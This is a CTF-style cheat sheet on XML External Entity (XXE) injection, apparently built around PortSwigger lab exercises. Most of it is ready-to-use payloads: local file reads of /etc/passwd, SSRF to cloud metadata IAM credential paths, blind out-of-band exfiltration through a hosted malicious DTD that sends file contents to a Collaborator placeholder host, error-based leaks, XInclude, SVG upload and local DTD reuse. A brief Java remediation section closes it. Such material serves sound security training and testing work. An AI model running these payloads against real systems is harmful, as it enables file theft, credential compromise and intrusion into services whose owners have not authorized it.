# XML External Entity (XXE) Injection — CTF Cheat Sheet

**Tools:** Burp Suite Community / Professional, Burp Collaborator, Exploit Server  
**Practice:** PortSwigger Web Security Academy  
**Scope:** Authorized CTFs and lab environments only

---

## 1. CTF Methodology

XXE occurs when an application parses XML input without disabling external entity resolution.

1. **Locate XML Parsing Endpoints:**
   - Explicit XML POST/PUT bodies (`Content-Type: application/xml` or `text/xml`).
   - JSON-to-XML conversion: Change `Content-Type: application/json` to `application/xml` and convert JSON format to XML.
   - File uploads: SVG image uploads, DOCX/XLSX files, XML-based data imports.
   - Partial XML parameters: Parameters inserted into backend XML templates without exposing the DOCTYPE declaration.
2. **Test Basic Entity Resolution:** Inject a custom internal entity:
   ```xml
   <!DOCTYPE test [ <!ENTITY myentity "mycanary" > ]>
   <stockCheck><productId>&myentity;</productId></stockCheck>
   ```
3. **Attempt File Disclosure (In-Band):** Reference `file:///etc/passwd` or `file:///c:/windows/win.ini`.
4. **Attempt SSRF:** Reference internal cloud metadata (`http://169.254.169.254/latest/meta-data/`).
5. **If Blind (No Direct Output):**
   - Probe via Out-of-Band (OAST) XML parameter entities (`%xxe;`).
   - Host an external DTD to exfiltrate data via HTTP/DNS or trigger error-based file leaks.
   - Repurpose local DTD files if outbound traffic is firewalled.
6. **If DOCTYPE is Blocked or Hidden:** Test **XInclude** (`xmlns:xi=...`).

---

## 2. In-Band File Disclosure & SSRF

### 1. Retrieving Local Files
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

---

### 2. Performing SSRF via External Entities
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

---

## 3. Blind XXE via Out-of-Band (OAST)

### 1. Parameter Entity OAST Probe
When normal entity references (`&xxe;`) are not evaluated inside XML elements, use parameter entities (`%xxe;`):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

---

### 2. Blind File Exfiltration via Malicious External DTD

XML parsers restrict referencing parameter entities inside an internal DTD. Bypass this by loading an **external DTD** from your exploit server.

**Step 1: Host `exploit.dtd` on Exploit Server:**
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
%eval;
%exfil;
```

**Step 2: Send Target Request:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://EXPLOIT-SERVER/exploit.dtd"> %xxe; ]>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```
*Result:* Target reads `/etc/hostname`, evaluates the nested entity, and transmits content as a URL parameter to Burp Collaborator.

---

### 3. Blind File Retrieval via Error Messages

If outbound HTTP to Collaborator is blocked, force an unhandled XML parsing error that reflects the target file content.

**Step 1: Host `error.dtd` on Exploit Server:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

**Step 2: Send Target Request:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://EXPLOIT-SERVER/error.dtd"> %xxe; ]>
<stockCheck>
    <productId>1</productId>
</stockCheck>
```
*Result:* Server attempts to open `file:///nonexistent/<file_contents>`, throwing an error: `java.io.FileNotFoundException: /nonexistent/root:x:0:0:...`.

---

## 4. XInclude Attacks (Hidden / Blocked DOCTYPE)

When you only control a single parameter injected into a backend XML template and cannot define a `<!DOCTYPE>` element, use `XInclude`:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

*Example request:*
```http
POST /product/stock HTTP/2
Content-Type: application/x-www-form-urlencoded

productId=%3Cfoo+xmlns%3Axi%3D%22http%3A%2F%2Fwww.w3.org%2F2001%2FXInclude%22%3E%3Cxi%3Ainclude+parse%3D%22text%22+href%3D%22file%3A%2F%2F%2Fetc%2Fpasswd%22%2F%3E%3C%2Ffoo%3E&storeId=1
```

---

## 5. XXE via SVG File Upload

When an application accepts image uploads (e.g. avatars, document attachments), upload a `.svg` file containing an XXE payload:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="200px" height="200px" xmlns="http://www.w3.org/2000/svg" version="1.1">
    <text font-size="16" x="10" y="25">&xxe;</text>
</svg>
```
*Result:* The server rasterizes the SVG; the contents of `/etc/hostname` are visibly printed onto the rendered avatar image.

---

## 6. Exploiting Local DTDs (Air-Gapped / Egress-Filtered)

When the server cannot make outbound connections to fetch external DTDs, repurpose an existing DTD file already present on the target server filesystem.

**Linux common path:** `/usr/share/yelp/dtd/docbookx.dtd`  
**Payload to override an entity and trigger an error:**

```xml
<!DOCTYPE foo [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
    '>
    %local_dtd;
]>
<stockCheck><productId>1</productId></stockCheck>
```

---

## 7. CTF Quick Reference

| Attack Pattern | Trigger / Technique | Target Output |
|---|---|---|
| **In-Band File Read** | `<!DOCTYPE x [ <!ENTITY e SYSTEM "file:///etc/passwd"> ]>` | Directly in response element |
| **SSRF** | `<!ENTITY e SYSTEM "http://169.254.169.254/... ">` | Cloud metadata in response |
| **Blind OAST** | Parameter entity `%xxe;` to Collaborator | DNS/HTTP lookup in Burp |
| **Out-of-Band Exfil** | External DTD loading `%file;` via HTTP | File contents in Burp query string |
| **Error-Based Leak** | External DTD referencing `file:///nonexistent/%file;` | File contents inside 500 error |
| **XInclude** | `<xi:include parse="text" href="file:///etc/passwd"/>` | In-band inside template |
| **SVG Upload** | Malicious `<svg>` with entity text | File text rendered on image |
| **Local DTD Reuse** | Repurposing `/usr/share/yelp/dtd/docbookx.dtd` | Error leak without outbound network |

---

## 8. Remediation

- **Completely disable XML external entity resolution (XXE) and DTD processing** in all XML parsers:
  ```java
  DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
  dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
  dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
  dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
  ```
- **Use simpler data formats:** Use JSON where XML features are unnecessary.
